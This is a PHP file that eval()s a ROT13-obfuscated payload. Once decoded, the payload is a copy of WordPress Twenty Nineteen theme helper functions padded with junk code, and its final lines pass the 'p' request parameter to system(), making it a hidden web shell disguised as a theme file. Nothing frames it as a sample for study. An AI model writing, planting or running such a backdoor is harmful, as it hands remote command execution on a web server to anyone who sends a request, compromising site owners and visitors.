<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Pbzzba gurzr shapgvbaf
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gjragl_Avargrra
 * @fvapr Gjragl Avargrra 1.5
 */

/**
 * Qrgrezvarf vs cbfg guhzoanvy pna or qvfcynlrq.
 */
shapgvba gjraglavargrra_pna_fubj_cbfg_guhzoanvy() {
	erghea nccyl_svygref( 'gjraglavargrra_pna_fubj_cbfg_guhzoanvy', ! cbfg_cnffjbeq_erdhverq() && ! vf_nggnpuzrag() && unf_cbfg_guhzoanvy() );
}

/**
 * Ergheaf gehr vs vzntr svygref ner ranoyrq ba gur gurzr bcgvbaf.
 */
shapgvba gjraglavargrra_vzntr_svygref_ranoyrq() {
	erghea 0 !== trg_gurzr_zbq( 'vzntr_svygre', 1 );
}

/**
 * Ergheaf gur fvmr sbe ningnef hfrq va gur gurzr.
 */
shapgvba gjraglavargrra_trg_ningne_fvmr() {
	erghea 60;
}

/**
 * Ergheaf gehr vs pbzzrag vf ol nhgube bs gur cbfg.
 *
 * @frr trg_pbzzrag_pynff()
 *
 * @cnenz JC_Pbzzrag|ahyy $pbzzrag Gur pbzzrag bowrpg gb purpx. Qrsnhygf gb gur pheerag pbzzrag.
 * @erghea obby Gehr vs gur pbzzrag vf ol gur nhgube bs gur cbfg, snyfr bgurejvfr.
 */
shapgvba gjraglavargrra_vf_pbzzrag_ol_cbfg_nhgube( $pbzzrag = ahyy ) {
	vs ( vf_bowrpg( $pbzzrag ) && $pbzzrag->hfre_vq > 0 ) {
		$hfre = trg_hfreqngn( $pbzzrag->hfre_vq );
		$cbfg = trg_cbfg( $pbzzrag->pbzzrag_cbfg_VQ );
		vs ( ! rzcgl( $hfre ) && ! rzcgl( $cbfg ) ) {
			erghea $pbzzrag->hfre_vq === $cbfg->cbfg_nhgube;
		}
	}
	erghea snyfr;
}

/**
 * Ergheaf vasbezngvba nobhg gur pheerag cbfg'f qvfphffvba, jvgu pnpur fhccbeg.
 */
shapgvba gjraglavargrra_trg_qvfphffvba_qngn() {
	fgngvp $qvfphffvba, $cbfg_vq;

	$pheerag_cbfg_vq = trg_gur_VQ();
	vs ( $pheerag_cbfg_vq === $cbfg_vq ) {
		erghea $qvfphffvba; /* Vs jr unir qvfphffvba vasbezngvba sbe cbfg VQ, erghea pnpurq bowrpg */
	} ryfr {
		$cbfg_vq = $pheerag_cbfg_vq;
	}

	$pbzzragf = trg_pbzzragf(
		neenl(
			'cbfg_vq' => $pheerag_cbfg_vq,
			'beqreol' => 'pbzzrag_qngr_tzg',
			'beqre'   => trg_bcgvba( 'pbzzrag_beqre', 'nfp' ), /* Erfcrpg pbzzrag beqre sebz Frggvatf » Qvfphffvba. */
			'fgnghf'  => 'nccebir',
			'ahzore'  => 20, /* Bayl ergevrir gur ynfg 20 pbzzragf, nf gur raq tbny vf whfg 6 havdhr nhgubef */
		)
	);

	$nhgubef = neenl();
	sbernpu ( $pbzzragf nf $pbzzrag ) {
		$nhgubef[] = ( (vag) $pbzzrag->hfre_vq > 0 ) ? (vag) $pbzzrag->hfre_vq : $pbzzrag->pbzzrag_nhgube_rznvy;
	}

	$nhgubef    = neenl_havdhr( $nhgubef );
	$qvfphffvba = (bowrpg) neenl(
		'nhgubef'   => neenl_fyvpr( $nhgubef, 0, 6 ),           /* Fvk havdhr nhgubef pbzzragvat ba gur cbfg. */
		'erfcbafrf' => trg_pbzzragf_ahzore( $pheerag_cbfg_vq ), /* Ahzore bs erfcbafrf. */
	);

	erghea $qvfphffvba;
}

/**
 * Pbairegf UFY gb URK be ETO pbybef.
 *
 * @cnenz sybng $u      Gur uhr pbzcbarag (0-360).
 * @cnenz sybng $f      Gur fnghengvba pbzcbarag (0-100).
 * @cnenz sybng $y      Gur yvtugarff pbzcbarag (0-100).
 * @cnenz obby  $gb_urk Jurgure gb pbaireg gb URK sbezng (gehr) be ETO (snyfr). Qrsnhyg gehr.
 */
shapgvba gjraglavargrra_ufy_urk( $u, $f, $y, $gb_urk = gehr ) {

	$u /= 360;
	$f /= 100;
	$y /= 100;

	$e = $y;
	$t = $y;
	$o = $y;
	$i = ( $y <= 0.5 ) ? ( $y * ( 1.0 + $f ) ) : ( $y + $f - $y * $f );

	vs ( $i > 0 ) {
		$z       = $y + $y - $i;
		$fi      = ( $i - $z ) / $i;
		$u      *= 6.0;
		$frkgnag = sybbe( $u );
		$senpg   = $u - $frkgnag;
		$ifs     = $i * $fi * $senpg;
		$zvq1    = $z + $ifs;
		$zvq2    = $i - $ifs;

		fjvgpu ( $frkgnag ) {
			pnfr 0:
				$e = $i;
				$t = $zvq1;
				$o = $z;
				oernx;
			pnfr 1:
				$e = $zvq2;
				$t = $i;
				$o = $z;
				oernx;
			pnfr 2:
				$e = $z;
				$t = $i;
				$o = $zvq1;
				oernx;
			pnfr 3:
				$e = $z;
				$t = $zvq2;
				$o = $i;
				oernx;
			pnfr 4:
				$e = $zvq1;
				$t = $z;
				$o = $i;
				oernx;
			pnfr 5:
				$e = $i;
				$t = $z;
				$o = $zvq2;
				oernx;
		}
	}

	$e = ebhaq( $e * 255, 0 );
	$t = ebhaq( $t * 255, 0 );
	$o = ebhaq( $o * 255, 0 );

	vs ( $gb_urk ) {

		$e = ( $e < 15 ) ? '0' . qrpurk( $e ) : qrpurk( $e );
		$t = ( $t < 15 ) ? '0' . qrpurk( $t ) : qrpurk( $t );
		$o = ( $o < 15 ) ? '0' . qrpurk( $o ) : qrpurk( $o );

		erghea \"#$e$t$o\";

	}

	erghea \"eto($e, $t, $o)\";
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>